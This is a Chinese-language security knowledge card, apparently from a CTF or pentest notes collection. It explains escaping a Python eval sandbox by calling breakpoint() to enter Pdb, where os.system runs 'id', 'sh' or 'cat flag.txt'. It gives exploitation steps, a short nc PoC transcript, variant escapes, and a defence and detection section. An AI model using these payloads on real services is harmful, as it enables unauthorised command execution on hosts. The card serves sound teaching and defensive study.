---
id: binary-pwn-sandbox-escape-python-jail-breakpoint-pdb
title: Python Jail 逃逸：breakpoint() 进入 Pdb 调试器绕过输入过滤执行任意命令
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-jail-breakpoint-pdb-escape
aliases:
- breakpoint() 逃逸
- Pdb 沙箱绕过
- Python eval jail
- 调试器二次输入通道
tags:
- python
- jail
- sandbox-escape
- breakpoint
- pdb
- eval
- rce
- audit-hook
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-11
  verified_at: '2026-11-08T07:27:34+08:00'
  notes: 已对照原文 PoC 核对：nc 目标后输入 breakpoint() 进入 Pdb，再 print(__import__('os').system('id'/'ls'/'cat flag.txt')) 成功回显 uid=1000(calc) 与 flag，属已打通；边界(PYTHONBREAKPOINT=0/审计钩子/无 tty)说明合理。问题：卡内两处『见同篇另一卡/接 sudo LD_PRELOAD 提权（同篇另一卡）』所指的 LD_PRELOAD 卡因与库内 pentest-privilege-escalation-sudo-ld-preload-env-keep 同链已被 reject，该交叉引用悬空，建议作者删除或改为直接描述；不影响本条 jail 链成立。
---

## 一句话结论

把用户输入交给 `eval`/`exec` 的 Python 计算器若只做关键字/字符黑名单，常漏掉内置函数 `breakpoint()`；调用它会进入 Pdb 交互式调试器，而调试器提示符里可自由执行 `__import__('os').system(...)`，从而绕过对原始输入的全部过滤拿到宿主机命令执行（getshell）。

## 原理

- `breakpoint()` 是 Python 内置函数，默认调用 `pdb.set_trace()` 进入调试器。它不需要参数、名字也通常不在 `__import__`、`os`、`system`、`eval`、`open` 这类黑名单词表里，因此能穿过输入校验。
- 关键在「第二输入通道」：过滤只作用于提交给计算器的那一行表达式；一旦进入 Pdb，后续命令由调试器命令行解释（`(Pdb) ...`），不再经过原来的受限 `eval` / 黑名单。Pdb 的表达式求值能访问完整内置命名空间与模块导入。
- 为什么过滤失效：攻击者把真正的载荷放在调试器提示符里输入，绕过了对「单一输入」的检查；这属于「校验器与实际执行环境不一致」，和注入/解析差异同源。
- 完整链：`breakpoint()` → `(Pdb) print(__import__('os').system('id'))` 验证 → `system('sh')` 打开 shell 或直接 `cat flag.txt` 读目标文件；本例还在 shell 里继续做 sudo 提权（见同篇另一卡）。
- 边界：需要进程把交互 stdin/tty 暴露给攻击者（如 `nc` 服务），`PYTHONBREAKPOINT` 未被设为 0，且没有 `sys.addaudithook` / seccomp 拦截 `import`、`os.system` 等事件。

## 触发条件

- 服务端把用户输入当 Python 表达式求值（eval/exec/计算器）；
- 防护仅靠关键字/字符黑名单，未用 AST 白名单；
- `breakpoint` / `pdb` / `PYTHONBREAKPOINT` 未被禁用；
- 服务提供交互式 stdin（nc / pty），未加审计钩子或系统调用限制。

## 利用步骤

1. 连上服务，提交 `breakpoint()`，等待出现 `(Pdb)` 提示符。
2. 在 Pdb 里执行 `print(__import__('os').system('id'))` 验证命令执行与回显。
3. 用 `system('sh')` 打开交互 shell，或直接 `system('cat flag.txt')` 读目标文件。
4. 如需更高权限，在得到的 shell 里继续信息收集/提权。

## PoC

```text
$ nc <target> 7002
>> breakpoint()
None
--Return--
> <string>(1)<module>()->None
(Pdb) print(__import__('os').system('id'))
uid=1000(calc) gid=1000(calc) groups=1000(calc)
0
(Pdb) print(__import__('os').system('sh'))
```

## 变体与关联

- 变体：`help()` / `input()` / `code.interact()` 等其它进入交互解释器的内置入口；`sys.addaudithook` 审计钩子绕过、`__subclasses__()` 遍历恢复 `__builtins__`、`os`/`subprocess` 模块被删后的重载；与「audit hook 绕过 / eval 过滤绕过」类 pyjail 互补。
- 关联：Python 沙箱逃逸、审计钩子、eval 过滤黑名单；本例 shell 之后接 `sudo LD_PRELOAD` 提权（同篇另一卡）。

## 检测与防御

- 防御：不要用 `eval` 处理不可信输入，改用 AST 白名单解析（只允许数字与四则运算节点）；设置 `PYTHONBREAKPOINT=0` 并用 `sys.addaudithook` 拦截 `pdb`/`import`/`os.system`/`subprocess`；以无 tty、最小权限、只读文件系统、seccomp 运行；移除或禁用 `os`/`subprocess`/`breakpoint` 等危险内置。
- 检测：输入中出现 `breakpoint`、`pdb`、`PYTHONBREAKPOINT`；进程意外进入交互式调试状态或派生 shell；audit 日志里的 import / 进程创建事件。
- 边界：非交互（一次性求值、无 stdin 回显）服务里 `breakpoint()` 会挂起或失败，需换其它逃逸手法。
